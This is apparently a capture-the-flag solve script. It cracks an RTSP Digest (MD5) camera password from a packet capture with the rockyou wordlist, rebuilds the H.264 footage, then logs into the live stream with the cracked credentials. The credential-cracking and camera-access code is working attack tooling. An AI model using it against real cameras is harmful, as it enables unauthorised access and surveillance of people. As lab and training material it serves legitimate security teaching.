"""
Security Cam - crack the RTSP password from a capture, then rebuild the video.

The camera streams RTSP on the non-standard TCP port 50002 (that's the Wireshark
hint: decode port 50002 as RTSP). The capture contains an RTSP Digest (MD5)
authentication, which we can crack offline against rockyou, plus the H.264 video
interleaved over the same TCP connection, which we can reassemble and play.

RTSP Digest (RFC 2617), algorithm=MD5:
    HA1      = MD5(username:realm:password)
    HA2      = MD5(method:uri)
    response = MD5(HA1:nonce:HA2)
We know username, realm, nonce, method, uri and the response from the capture,
so we try each rockyou word until the response matches.

The capture itself is only an old park recording whose job is to leak the auth;
the flag is on the LIVE feed (a classroom chalkboard), so the script ends by
opening the live stream with the cracked credentials.

Usage: python3 solve.py security-cam.pcapng rockyou.txt
Requires: pip install scapy ; ffmpeg/ffplay on PATH
"""
import base64
import hashlib
import re
import subprocess
import sys

from scapy.all import rdpcap, TCP, Raw

RTSP_PORT = 50002


def reassemble(pkts, sport=None, dport=None):
    """Rebuild one direction of the TCP stream, placing each segment at its
    sequence offset so retransmissions and overlaps don't shift the data."""
    segs = []
    for p in pkts:
        if TCP in p and Raw in p:
            if (sport is not None and p[TCP].sport == sport) or \
               (dport is not None and p[TCP].dport == dport):
                segs.append((p[TCP].seq, bytes(p[Raw].load)))
    if not segs:
        return b""
    base = min(s for s, _ in segs)
    buf = bytearray()
    for seq, data in sorted(segs):
        off = seq - base
        if off + len(data) > len(buf):
            buf.extend(b"\x00" * (off + len(data) - len(buf)))
        buf[off:off + len(data)] = data  # exact placement; overlaps just overwrite
    return bytes(buf)


def crack_password(stream, wordlist_path):
    # Pull the first authenticated request's digest fields out of the RTSP text
    auth = re.search(rb'Authorization: Digest ([^\r\n]+)', stream).group(1).decode()
    fields = dict(re.findall(r'(\w+)="?([^",]+)"?', auth))
    # The method is the verb on the request line that carries this Authorization header
    block = stream[:stream.index(auth.encode())]
    method = re.findall(rb'(?m)^(\w+) rtsp://', block)[-1].decode()

    ha2 = hashlib.md5(f"{method}:{fields['uri']}".encode()).hexdigest()
    target, user, realm, nonce = (fields['response'], fields['username'],
                                  fields['realm'], fields['nonce'])

    with open(wordlist_path, "rb") as fh:
        for line in fh:
            pw = line.rstrip(b"\r\n")
            try:
                pw_s = pw.decode()
            except UnicodeDecodeError:
                continue
            ha1 = hashlib.md5(f"{user}:{realm}:{pw_s}".encode()).hexdigest()
            if hashlib.md5(f"{ha1}:{nonce}:{ha2}".encode()).hexdigest() == target:
                return user, pw_s, fields['uri']
    return user, None, fields['uri']


def rebuild_video(stream, out_h264="out.h264"):
    # SPS/PPS come from the SDP 'sprop-parameter-sets' (two base64 NALs)
    sprop = re.search(rb'sprop-parameter-sets=([^;,\r\n]+),([^;,\r\n]+)', stream)
    sps, pps = base64.b64decode(sprop.group(1)), base64.b64decode(sprop.group(2))

    # Interleaved data begins right after the PLAY response (the RTP-Info block).
    play = list(re.finditer(rb'RTP-Info:.*?\r\n\r\n', stream, re.S))
    i = stream.find(b"\r\n\r\n", play[-1].start()) + 4 if play else 0

    # Walk the stream. '$' (0x24) marks a binary frame: $ channel len(2) data.
    # The server also interleaves plain RTSP text messages (keepalives); those
    # must be skipped by their headers (+ Content-Length), NOT by hunting for the
    # next '$', or real video packets get eaten and the picture corrupts.
    rtp = []
    n = len(stream)
    while i + 4 <= n:
        if stream[i] == 0x24:
            ch = stream[i + 1]
            ln = int.from_bytes(stream[i + 2:i + 4], "big")
            if ch == 0:  # channel 0 = RTP video
                rtp.append(stream[i + 4:i + 4 + ln])
            i += 4 + ln
        else:
            hdr_end = stream.find(b"\r\n\r\n", i)
            if hdr_end == -1:
                break
            cl = re.search(rb'Content-Length:\s*(\d+)', stream[i:hdr_end])
            i = hdr_end + 4 + (int(cl.group(1)) if cl else 0)

    # Depacketize H.264 (RFC 6184): single NAL, STAP-A (24), FU-A (28)
    nals, fu = [], b""
    for pl in rtp:
        if len(pl) < 12:
            continue
        # Skip the RTP header, including any CSRC list and extension header
        offset = 12 + 4 * (pl[0] & 0x0f)
        if (pl[0] >> 4) & 1 and offset + 4 <= len(pl):
            offset += 4 + 4 * int.from_bytes(pl[offset + 2:offset + 4], "big")
        hdr = pl[offset:]
        if not hdr:
            continue
        nt = hdr[0] & 0x1f
        if 1 <= nt <= 23:
            nals.append(hdr)
        elif nt == 24:
            j = 1
            while j + 2 <= len(hdr):
                sz = int.from_bytes(hdr[j:j + 2], "big"); j += 2
                nals.append(hdr[j:j + sz]); j += sz
        elif nt == 28:
            fuh = hdr[1]
            if fuh & 0x80:
                fu = bytes([(hdr[0] & 0xe0) | (fuh & 0x1f)]) + hdr[2:]
            else:
                fu += hdr[2:]
            if fuh & 0x40:
                nals.append(fu); fu = b""

    sc = b"\x00\x00\x00\x01"
    with open(out_h264, "wb") as f:
        f.write(sc + sps + sc + pps)
        for n in nals:
            f.write(sc + n)
    return out_h264


def main():
    pcap, wordlist = sys.argv[1], sys.argv[2]
    pkts = rdpcap(pcap)
    client_stream = reassemble(pkts, dport=RTSP_PORT)   # requests (Authorization)
    server_stream = reassemble(pkts, sport=RTSP_PORT)   # responses + video

    user, password, uri = crack_password(client_stream, wordlist)
    print(f"Username: {user}")
    print(f"Password: {password}")

    if not password:
        print("Password not found in the wordlist.")
        return

    # Rebuild the captured footage (optional - it's just the old park recording)
    rebuild_video(server_stream)
    subprocess.run(["ffmpeg", "-y", "-loglevel", "error",
                    "-i", "out.h264", "-c", "copy", "security-cam.mp4"])
    print("Recorded footage written to security-cam.mp4 (the capture shows a park).")

    # The flag is on the LIVE feed - open it so you can read the chalkboard.
    auth_uri = uri.replace("rtsp://", f"rtsp://{user}:{password}@")
    print(f"\nOpening the live stream - read the flag off the chalkboard:\n  {auth_uri}")
    try:
        subprocess.run(["ffplay", "-rtsp_transport", "tcp", "-loglevel", "warning",
                        auth_uri])
    except FileNotFoundError:
        # ffplay not installed: grab a single frame instead
        print("ffplay not found; saving one live frame to live.png instead.")
        subprocess.run(["ffmpeg", "-y", "-rtsp_transport", "tcp", "-loglevel", "error",
                        "-i", auth_uri, "-frames:v", "1", "live.png"])
        print("Saved live.png - open it to read the flag.")


if __name__ == "__main__":
    main()
